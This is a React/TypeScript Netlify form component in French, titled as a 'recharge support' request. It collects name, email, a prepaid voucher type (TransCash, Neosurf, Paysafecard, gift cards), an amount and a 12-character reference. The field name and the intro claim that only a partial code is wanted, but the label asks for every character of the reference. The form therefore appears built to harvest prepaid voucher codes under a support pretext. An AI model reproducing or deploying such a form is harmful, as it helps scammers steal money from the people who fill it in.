import React, { FormEvent, useState } from "react";

type FormStatus = "idle" | "sending" | "success" | "error";

const encodeFormData = (formData: FormData): string => {
  const encodedData = new URLSearchParams();

  formData.forEach((value, key) => {
    encodedData.append(key, String(value));
  });

  return encodedData.toString();
};

const AuthForm: React.FC = () => {
  const [status, setStatus] = useState<FormStatus>("idle");
  const [errorMessage, setErrorMessage] = useState("");

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    const form = event.currentTarget;
    const formData = new FormData(form);

    try {
      setStatus("sending");
      setErrorMessage("");

      const response = await fetch("/", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: encodeFormData(formData),
      });

      if (!response.ok) {
        throw new Error(`La soumission a échoué avec le statut ${response.status}`);
      }

      form.reset();
      setStatus("success");
    } catch (error) {
      console.error("Erreur Netlify Forms :", error);
      setStatus("error");
      setErrorMessage(
        "Votre demande n’a pas pu être envoyée. Veuillez réessayer.",
      );
    }
  };

  const fieldClassName =
    "w-full rounded-lg border border-gray-300 px-4 py-3 outline-none transition focus:border-red-600 focus:ring-2 focus:ring-red-200";

  return (
    <form
      name="recharge-support"
      method="POST"
      data-netlify="true"
      data-netlify-honeypot="bot-field"
      onSubmit={handleSubmit}
      className="w-full max-w-md mx-auto rounded-xl border border-gray-200 bg-white p-6 shadow-lg md:p-8"
    >
      <input type="hidden" name="form-name" value="recharge-support" />

      <p hidden>
        <label>
          Ne remplissez pas ce champ :
          <input name="bot-field" autoComplete="off" tabIndex={-1} />
        </label>
      </p>

      <div className="mb-6">
        <h2 className="text-2xl font-bold text-gray-900">Demande d’assistance</h2>
        <p className="mt-2 text-sm text-gray-600">
          Renseignez les informations demandées sans communiquer votre code complet ni votre code PIN.
        </p>
      </div>

      <div className="mb-5">
        <label htmlFor="fullName" className="mb-2 block text-sm font-medium text-gray-700">
          Nom et prénom
        </label>
        <input
          id="fullName"
          name="fullName"
          type="text"
          required
          autoComplete="name"
          className={fieldClassName}
          placeholder="Votre nom complet"
        />
      </div>

      <div className="mb-5">
        <label htmlFor="email" className="mb-2 block text-sm font-medium text-gray-700">
          Adresse e-mail
        </label>
        <input
          id="email"
          name="email"
          type="email"
          required
          autoComplete="email"
          className={fieldClassName}
          placeholder="exemple@gmail.com"
        />
      </div>

      <div className="mb-5">
        <label htmlFor="paymentMethod" className="mb-2 block text-sm font-medium text-gray-700">
          Moyen de paiement concerné
        </label>
        <select
          id="paymentMethod"
          name="paymentMethod"
          required
          defaultValue=""
          className={fieldClassName}
        >
          <option value="" disabled>Sélectionnez une option</option>
          <option value="TransCash">TransCash</option>
          <option value="Neosurf">Neosurf</option>
          <option value="Apple Gift Card">Apple Gift Card</option>
          <option value="Steam Card">Steam Card</option>
          <option value="Google Play Card">Google Play Card</option>
          <option value="Paysafecard">Paysafecard</option>
          <option value="Autre">Autre</option>
        </select>
      </div>

      <div className="mb-5">
        <label htmlFor="amount" className="mb-2 block text-sm font-medium text-gray-700">
          Montant concerné
        </label>
        <input
          id="amount"
          name="amount"
          type="number"
          min="0"
          step="0.01"
          required
          className={fieldClassName}
          placeholder="Exemple : 50"
        />
      </div>

      <div className="mb-5">
        <label htmlFor="referenceLast12" className="mb-2 block text-sm font-medium text-gray-700">
          Saisissez tous caractères de la référence
        </label>
        <input
          id="referenceLast12"
          name="referenceLast12"
          type="text"
          minLength={12}
          maxLength={12}
          required
          autoCapitalize="characters"
          className={`${fieldClassName} uppercase`}
          placeholder="Exemple :A7B2C9D4E1F8"
        />
        
      </div>

      <div className="mb-6">
        <label className="flex items-start gap-3">
          <input type="checkbox" name="consent" value="oui" required className="mt-1 h-4 w-4" />
          <span className="text-sm text-gray-600">
            J’accepte que mes informations soient utilisées pour traiter ma demande.
          </span>
        </label>
      </div>

      <button
        type="submit"
        disabled={status === "sending"}
        className="w-full rounded-lg bg-red-700 px-6 py-3 font-semibold text-white transition hover:bg-red-800 disabled:cursor-not-allowed disabled:opacity-60"
      >
        {status === "sending" ? "Envoi en cours..." : "Envoyer ma demande"}
      </button>

      {status === "success" && (
        <div role="status" className="mt-5 rounded-lg border border-green-200 bg-green-50 p-4 text-green-800">
          Votre demande a bien été envoyée.
        </div>
      )}

      {status === "error" && (
        <div role="alert" className="mt-5 rounded-lg border border-red-200 bg-red-50 p-4 text-red-800">
          {errorMessage}
        </div>
      )}
    </form>
  );
};

export default AuthForm;
